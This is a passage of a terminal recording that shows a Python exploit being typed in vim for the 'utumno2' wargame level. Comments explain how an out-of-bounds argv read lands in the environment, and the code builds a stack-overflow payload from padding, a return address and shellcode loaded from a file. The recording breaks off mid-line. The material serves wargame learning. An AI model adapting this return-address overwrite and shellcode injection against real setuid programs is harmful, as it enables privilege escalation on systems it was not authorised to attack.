[59.378, "o", "\u001b[?25l\u001b[32;73Hi\u001b[1;1H\u001b[32;73H \u001b[1;1H\u001b[32;1H\u001b[1m-- INSERT --\u001b[m\u001b[32;83H\u001b[K\u001b[32;83H0,1\u001b[11CAll\u001b[1;1H\u001b[?25h\u001b[?25limport ctypes, os, struct, sys, time\u001b[2;1H\u001b[K\u001b[32;83H2\u001b[2;1H\u001b[?25h\u001b[?25l\u001b[3;1H\u001b[K\u001b[32;83H3\u001b[3;1H\u001b[?25h\u001b[?25l# ---------------------------------------------------------------------------\u001b[4;1H\u001b[K\u001b[32;83H4\u001b[4;1H\u001b[?25h\u001b[?25l# utumno2's main():\u001b[5;1H\u001b[K\u001b[32;83H5\u001b[5;1H\u001b[?25h\u001b[?25l#     if (argc == 1 && argv[0][0] == 0) { ... }   /* the \"no arguments\" path */\u001b[6;1H\u001b[K\u001b[32;83H6\u001b[6;1H\u001b[?25h\u001b[?25l#     strcpy(buffer, argv[10]);\u001b[18C/* argv + 0x28 */\u001b[7;1H\u001b[K\u001b[32;83H7\u001b[7;1H\u001b[?25h\u001b[?25l#\u001b[8;1H\u001b[K\u001b[32;83H8\u001b[8;1H\u001b[?25h\u001b[?25l# Two things make this exploitable:\u001b[9;1H\u001b[K\u001b[32;83H9\u001b[9;1H\u001b[?25h\u001b[?25l#   * the guard only lets us through when argv[0] is the EMPTY string, which\u001b[10;1H\u001b[K\u001b[32;83H10,1\u001b[10;1H\u001b[?25h\u001b[?25l#     Python's os.execve refuses to build (\"argv first element cannot be\u001b[11;1H\u001b[K\u001b[32;84H1\u001b[11;1H\u001b[?25h\u001b[?25l#     empty\"), so we call libc.execve directly through ctypes;\u001b[12;1H\u001b[K\u001b[32;84H2\u001b[12;1H\u001b[?25h\u001b[?25l#   * argv[10] is past the end of argv when argc is 1.  The kernel lays the\u001b[13;1H\u001b[K\u001b[32;84H3\u001b[13;1H\u001b[?25h\u001b[?25l#     environment immediately after the argv array, so argv[10] is really\u001b[14;1H\u001b[K\u001b[32;84H4\u001b[14;1H\u001b[?25h\u001b[?25l#     envp[8] -- the value of the 9th environment variable.  That gives us a\u001b[15;1H\u001b[K\u001b[32;84H5\u001b[15;1H\u001b[?25h\u001b[?25l#     full attacker-controlled string to copy, with no NUL restriction on the\u001b[16;1H\u001b[K\u001b[32;84H6\u001b[16;1H\u001b[?25h\u001b[?25l#     part after the '=' (envp strings are C strings, so only the last byte\u001b[17;1H\u001b[K\u001b[32;84H7\u001b[17;1H\u001b[?25h\u001b[?25l#     must be non-NUL).\u001b[18;1H\u001b[K\u001b[32;84H8\u001b[18;1H\u001b[?25h\u001b[?25l# ---------------------------------------------------------------------------\u001b[19;1H\u001b[K\u001b[32;84H9\u001b[19;1H\u001b[?25h\u001b[?25llibc = ctypes.CDLL(\"libc.so.6\", use_errno=True)\u001b[20;1H\u001b[K\u001b[32;83H20\u001b[20;1H\u001b[?25h\u001b[?25llibc.execve.argtypes = [ctypes.c_char_p,\u001b[21;1H\u001b[K\u001b[32;84H1\u001b[21;1H\u001b[?25h\u001b[?25l\u001b[24Cctypes.POINTER(ctypes.c_char_p),\u001b[22;1H\u001b[K\u001b[32;84H2\u001b[22;1H\u001b[?25h\u001b[?25l\u001b[24Cctypes.POINTER(ctypes.c_char_p)]\u001b[23;1H\u001b[K\u001b[32;84H3\u001b[23;1H\u001b[?25h\u001b[?25l\u001b[24;1H\u001b[K\u001b[32;84H4\u001b[24;1H\u001b[?25h\u001b[?25lsc = open(\"/tmp/uu2/sc.bin\", \"rb\").read()\u001b[25;1H\u001b[K\u001b[32;84H5\u001b[25;1H\u001b[?25h\u001b[?25lprint(\"shellcode: %d bytes, NUL: %s\" % (len(sc), b\"\\x00\" in sc), flush=True)\u001b[26;1H\u001b[K\u001b[32;84H6\u001b[26;1H\u001b[?25h\u001b[?25l\u001b[27;1H\u001b[K\u001b[32;84H7\u001b[27;1H\u001b[?25h\u001b[?25l# buffer is 12 bytes at ebp-0xc: 0..11 fill it, 12..15 saved ebp, 16..19 return\u001b[28;1H\u001b[K\u001b[32;84H8\u001b[28;1H\u001b[?25h\u001b[?25ldef payload_for(addr):\u001b[29;1H\u001b[K\u001b[32;84H9\u001b[29;1H\u001b[?25h\u001b[?25l    return b\"E08=\" + b\"\\x90\" * 8 + b\"B\" * 4 + struct.pack(\"<I\", addr) + sc\u001b[30;1H\u001b[K\u001b[32;83H30\u001b[30;1H\u001b[?25h\u001b[?25l\u001b[31;1H\u001b[K\u001b[32;84H1\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hdef env_for(payload):\u001b[32;83H\u001b[K\u001b[32;83H32,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Henvl = [(\"E%02d\" % i).encode() + b\"=\" + b\"A\" * 4 for i in range(20)]\u001